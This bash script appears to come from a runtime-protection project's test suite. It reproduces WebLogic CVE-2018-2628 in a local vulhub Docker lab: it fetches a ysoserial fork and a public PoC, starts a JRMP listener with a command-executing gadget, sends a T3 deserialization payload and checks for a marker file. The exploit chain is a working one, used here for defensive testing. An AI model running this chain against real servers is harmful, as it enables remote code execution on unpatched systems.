#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

image="${OHMYRASP_VULHUB_WEBLOGIC_2628_IMAGE:-vulhub/weblogic:10.3.6.0-2017}"
java8_tool_image="${OHMYRASP_VULHUB_WEBLOGIC_2628_JAVA8_TOOL_IMAGE:-vulhub/weblogic:12.2.1.3-2018}"
baseline_name="${OHMYRASP_VULHUB_WEBLOGIC_2628_BASELINE_NAME:-ohmyrasp-weblogic2628-baseline}"
listener_name="${OHMYRASP_VULHUB_WEBLOGIC_2628_LISTENER_NAME:-ohmyrasp-weblogic2628-jrmp-listener}"
weblogic_port=7001
jrmp_port="${OHMYRASP_VULHUB_WEBLOGIC_2628_JRMP_PORT:-21998}"
marker="${OHMYRASP_VULHUB_WEBLOGIC_2628_MARKER:-/tmp/ohmyrasp-weblogic-2628-success}"
host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"
baseline_dir="logs/vulhub-weblogic-10.3.6.0-2628-java6-baseline"
protected_dir="logs/vulhub-weblogic-10.3.6.0-2628-java6-protected"
payload_dir="logs/vulhub-weblogic-10.3.6.0-2628-java6-payload"
payload_jar_url="${OHMYRASP_VULHUB_WEBLOGIC_2628_YSOSERIAL_URL:-https://github.com/tdy218/ysoserial-cve-2018-2628/releases/download/v0.1/ysoserial-0.1-cve-2018-2628-all.jar}"
payload_jar_sha256="${OHMYRASP_VULHUB_WEBLOGIC_2628_YSOSERIAL_SHA256:-bf5dbfc2303592482368d58e6af410412e307657eb55ab6fa12805f909cd0253}"
payload_jar="${OHMYRASP_VULHUB_WEBLOGIC_2628_YSOSERIAL_JAR:-${payload_dir}/ysoserial-0.1-cve-2018-2628-all.jar}"
poc_url="${OHMYRASP_VULHUB_WEBLOGIC_2628_POC_URL:-https://raw.githubusercontent.com/tdy218/ysoserial-cve-2018-2628/dd9ecbb61268c75c49d1714b8c5038c6881e6227/wls-cve-2018-2628-poc.py}"
poc_sha256="${OHMYRASP_VULHUB_WEBLOGIC_2628_POC_SHA256:-430bf54e0dffb1de43d43bf26f8ff3f8e85be9638710b745f36d42411066f603}"
poc_source="${OHMYRASP_VULHUB_WEBLOGIC_2628_POC:-${payload_dir}/wls-cve-2018-2628-poc.py}"
if [[ "$payload_jar" != /* ]]; then
  payload_jar="$(pwd)/${payload_jar}"
fi
if [[ "$poc_source" != /* ]]; then
  poc_source="$(pwd)/${poc_source}"
fi
baseline_host=""

copy_artifacts() {
  mkdir -p "$baseline_dir" "$payload_dir"
  if docker inspect "$baseline_name" >/dev/null 2>&1; then
    docker logs "$baseline_name" > "${baseline_dir}/container.log" 2>&1 || true
    docker exec "$baseline_name" bash -lc \
      'tail -n 200 /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log 2>/dev/null || true; echo "---"; ls -l /tmp/ohmyrasp-weblogic-2628-success 2>/dev/null || true' \
      > "${baseline_dir}/adminserver.log" 2>&1 || true
  fi
  if docker inspect "$listener_name" >/dev/null 2>&1; then
    docker logs "$listener_name" > "${payload_dir}/jrmp-listener.log" 2>&1 || true
  fi
}

cleanup() {
  copy_artifacts
  docker rm -f -v "$baseline_name" "$listener_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

curl_status() {
  local output="$1"
  shift
  local status
  status="$(curl --max-time 60 -sS -o "$output" -w "%{http_code}" "$@" 2>"${output}.err" || true)"
  if [[ -z "$status" ]]; then
    status="000"
  fi
  printf "%s" "$status"
}

build_java8_agent() {
  mkdir -p /tmp/ohmyrasp-gradle-cache
  docker run --rm -u "$(id -u):$(id -g)" \
    -e GRADLE_USER_HOME=/tmp/gradle-cache \
    -v /tmp/ohmyrasp-gradle-cache:/tmp/gradle-cache \
    -v "$(pwd):/workspace" \
    -w /workspace \
    gradle:jdk25 \
    gradle --no-daemon :agent-java8:agentJava8Jar >/dev/null
}

verify_java6_boundary() {
  docker run --rm --entrypoint bash "$image" -lc \
    '"$JAVA16_HOME/bin/java" -version' > "${protected_dir}/image-java-version.txt" 2>&1
  if ! grep -Fq 'java version "1.6.0_45"' "${protected_dir}/image-java-version.txt"; then
    cat "${protected_dir}/image-java-version.txt" >&2 || true
    echo "WebLogic CVE-2018-2628 image did not report the expected Java 6 runtime" >&2
    exit 1
  fi

  set +e
  docker run --rm --entrypoint bash \
    -v "${host_agent_jar}:/tmp/ohmyrasp-agent-java8.jar:ro" \
    "$image" -lc '"$JAVA16_HOME/bin/java" -javaagent:/tmp/ohmyrasp-agent-java8.jar -version' \
    > "${protected_dir}/java8-agent-on-java6.log" 2>&1
  local status="$?"
  set -e
  printf 'java8_agent_on_java6_status=%s\n' "$status" > "${protected_dir}/attempts.log"
  if ! grep -Fq 'Unsupported major.minor version 52.0' "${protected_dir}/java8-agent-on-java6.log"; then
    cat "${protected_dir}/java8-agent-on-java6.log" >&2 || true
    echo "Java 6 WebLogic did not reject the Java 8 agent with the expected class-version error" >&2
    exit 1
  fi
}

prepare_payload_tool() {
  mkdir -p "$payload_dir" "$(dirname "$payload_jar")" "$(dirname "$poc_source")"
  if [[ -z "${OHMYRASP_VULHUB_WEBLOGIC_2628_YSOSERIAL_JAR:-}" ]]; then
    curl -fL --retry 3 --retry-delay 2 -o "$payload_jar" "$payload_jar_url"
  fi
  if [[ -z "${OHMYRASP_VULHUB_WEBLOGIC_2628_POC:-}" ]]; then
    curl -fL --retry 3 --retry-delay 2 -o "$poc_source" "$poc_url"
  fi
  if [[ ! -s "$payload_jar" ]]; then
    echo "WebLogic CVE-2018-2628 ysoserial tool jar is missing or empty: ${payload_jar}" >&2
    exit 1
  fi
  if [[ ! -s "$poc_source" ]]; then
    echo "WebLogic CVE-2018-2628 PoC source is missing or empty: ${poc_source}" >&2
    exit 1
  fi
  sha256sum "$payload_jar" > "${payload_dir}/ysoserial.sha256"
  if [[ -n "$payload_jar_sha256" ]] \
      && ! awk -v expected="$payload_jar_sha256" '{exit $1 == expected ? 0 : 1}' "${payload_dir}/ysoserial.sha256"; then
    cat "${payload_dir}/ysoserial.sha256" >&2 || true
    echo "WebLogic CVE-2018-2628 ysoserial tool jar sha256 mismatch" >&2
    exit 1
  fi
  sha256sum "$poc_source" > "${payload_dir}/poc-source.sha256"
  if [[ -n "$poc_sha256" ]] \
      && ! awk -v expected="$poc_sha256" '{exit $1 == expected ? 0 : 1}' "${payload_dir}/poc-source.sha256"; then
    cat "${payload_dir}/poc-source.sha256" >&2 || true
    echo "WebLogic CVE-2018-2628 PoC source sha256 mismatch" >&2
    exit 1
  fi
}

generate_jrmpclient2_payload() {
  docker run --rm \
    -v "${payload_jar}:/payload/ysoserial-2628.jar:ro" \
    --entrypoint sh "$java8_tool_image" -lc \
    "java -jar /payload/ysoserial-2628.jar JRMPClient2 host.docker.internal:${jrmp_port}" \
    > "${payload_dir}/jrmpclient2.bin"
  if [[ ! -s "${payload_dir}/jrmpclient2.bin" ]]; then
    echo "WebLogic CVE-2018-2628 JRMPClient2 payload generation produced no bytes" >&2
    exit 1
  fi
  xxd -p -c 999999 "${payload_dir}/jrmpclient2.bin" > "${payload_dir}/jrmpclient2.hex"
}

start_jrmp_listener() {
  docker run -d --name "$listener_name" \
    --network host \
    -v "${payload_jar}:/payload/ysoserial-2628.jar:ro" \
    --entrypoint sh "$java8_tool_image" -lc \
    "java -cp /payload/ysoserial-2628.jar ysoserial.exploit.JRMPListener ${jrmp_port} Jdk7u21 'touch ${marker}'" \
    >/dev/null

  for attempt in $(seq 1 30); do
    docker logs "$listener_name" > "${payload_dir}/jrmp-listener.log" 2>&1 || true
    if grep -Fq 'Opening JRMP listener' "${payload_dir}/jrmp-listener.log"; then
      printf 'jrmp_listener_attempt=%s\n' "$attempt" >> "${payload_dir}/attempts.log"
      return
    fi
    sleep 1
  done
  cat "${payload_dir}/jrmp-listener.log" >&2 || true
  echo "WebLogic CVE-2018-2628 JRMP listener did not become ready" >&2
  exit 1
}

start_baseline() {
  docker run -d --name "$baseline_name" \
    --add-host=host.docker.internal:host-gateway \
    "$image" >/dev/null
  baseline_host="$(docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' "$baseline_name")"
  if [[ -z "$baseline_host" ]]; then
    echo "unable to resolve WebLogic CVE-2018-2628 baseline container IP" >&2
    exit 1
  fi
  printf 'baseline_host=%s\n' "$baseline_host" > "${baseline_dir}/network.log"
}

wait_for_weblogic() {
  local status
  for attempt in $(seq 1 240); do
    status="$(curl_status "${baseline_dir}/ready-${attempt}.html" "http://${baseline_host}:${weblogic_port}/")"
    printf 'ready_attempt=%s status=%s\n' "$attempt" "$status" >> "${baseline_dir}/attempts.log"
    if [[ "$status" == "200" || "$status" == "302" || "$status" == "404" ]]; then
      cp "${baseline_dir}/ready-${attempt}.html" "${baseline_dir}/root-ready.html"
      return
    fi
    if ! docker ps --filter "name=${baseline_name}" --filter status=running --format '{{.Names}}' \
      | grep -Fq "$baseline_name"; then
      docker logs "$baseline_name" >&2 || true
      echo "WebLogic CVE-2018-2628 baseline container stopped before readiness" >&2
      exit 1
    fi
    sleep 2
  done

  docker logs "$baseline_name" >&2 || true
  echo "WebLogic CVE-2018-2628 baseline did not become ready on ${baseline_host}:${weblogic_port}" >&2
  exit 1
}

send_t3_jrmpclient2_payload() {
  local poc_py3="${payload_dir}/wls-cve-2018-2628-poc-py3.py"
  local payload_hex
  payload_hex="$(cat "${payload_dir}/jrmpclient2.hex")"
  cp "$poc_source" "$poc_py3"
  perl -0pi -e "s/p_sock\\.send\\('([0-9a-f]+)'\\.decode\\('hex'\\)\\)/p_sock.send(bytes.fromhex('\\1'))/g; s/p_sock\\.send\\(d\\.decode\\('hex'\\)\\)/p_sock.send(bytes.fromhex(d))/g; s/p_sock\\.send\\(payload\\.decode\\('hex'\\)\\)/p_sock.send(bytes.fromhex(payload))/g; s/len\\(payload\\) \\/ 2 \\+ 4/len(payload) \\/\\/ 2 + 4/g; s/response_data = ''/response_data = b''/g; s/except socket\\.error, e:/except socket.error as e:/g; s/re\\.findall\\(result_check_str, response_data, re\\.S\\)/re.findall(result_check_str, response_data.decode('latin1', 'ignore'), re.S)/g" "$poc_py3"
  perl -0pi -e "s/^payload_str = '[0-9a-f]+'$/payload_str = '${payload_hex}'/m" "$poc_py3"
  python3 -m py_compile "$poc_py3"
  python3 "$poc_py3" "$baseline_host" "$weblogic_port" \
    > "${payload_dir}/t3-jrmpclient2-probe.log" 2>&1
}

wait_for_marker() {
  for attempt in $(seq 1 30); do
    if docker exec "$baseline_name" test -f "$marker" >/dev/null 2>&1; then
      docker exec "$baseline_name" ls -l "$marker" > "${baseline_dir}/marker.txt" 2>&1 || true
      printf 'marker_attempt=%s\n' "$attempt" >> "${baseline_dir}/attempts.log"
      return
    fi
    sleep 1
  done
  cat "${payload_dir}/t3-jrmpclient2-probe.log" >&2 || true
  cat "${payload_dir}/jrmp-listener.log" >&2 || true
  docker logs "$baseline_name" >&2 || true
  echo "baseline WebLogic CVE-2018-2628 did not create marker ${marker}" >&2
  exit 1
}

build_java8_agent

rm -rf "$baseline_dir" "$protected_dir" "$payload_dir"
mkdir -p "$baseline_dir" "$protected_dir" "$payload_dir"
docker rm -f -v "$baseline_name" "$listener_name" >/dev/null 2>&1 || true

verify_java6_boundary
prepare_payload_tool
generate_jrmpclient2_payload
start_jrmp_listener
start_baseline
wait_for_weblogic
send_t3_jrmpclient2_payload
wait_for_marker
copy_artifacts
docker rm -f -v "$baseline_name" "$listener_name" >/dev/null 2>&1 || true

echo "vulhub WebLogic CVE-2018-2628 Java6 legacy boundary passed"
